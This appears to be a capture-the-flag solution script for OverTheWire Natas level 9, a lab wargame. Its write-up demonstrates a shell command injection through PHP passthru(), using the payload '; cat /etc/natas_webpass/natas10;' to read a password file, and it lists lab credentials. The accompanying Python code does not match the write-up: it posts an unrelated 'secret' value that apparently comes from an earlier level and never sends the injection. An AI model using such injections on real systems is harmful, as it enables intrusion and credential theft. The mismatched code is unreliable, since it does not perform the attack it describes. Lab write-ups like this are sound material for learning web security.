#!/usr/bin/env python3
'''
 
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas9.py



Level 9 → Level 10
Username: natas9
URL:      http://natas9.natas.labs.overthewire.org
password: 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
problem :  On successfully logging in the natas9 webpage, we will have a form
         in front of us.
         It says “Find words containing”
write up:
  1. Opened the source code.
    a.  When we enter a keyword, it is passed via
        a function called passthru().
    b.
	    if($key != "") {
          passthru("grep -i $key dictionary.txt")

	     Lets try passing ” ;echo hello; “.
	     The passthru function performs the query
		      ” passthru(“grep -i;echo hello;dictionary.txt”); ”
	      and prints hello on the screen.
		 If we pass the file location of the password for natas10,
		 the application should   respond back with the password.
		   We now pass
  2. ” ; cat /etc/natas_webpass/natas10;  ”
   output: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu


'''
import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'


url0 = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url0, auth = (username, password) )
content = response.text
print("1. response.text \n------------------\n",response.text)

session = requests.Session()
# response = session.get(url, auth = (username, password) )
response = session.post(url0, data = {"secret": "oubWYf2kBq", "submit":"submit" }, auth = (username, password) )

content = response.text

# print content

print (re.findall('natas10 is (.*)', content)[0])
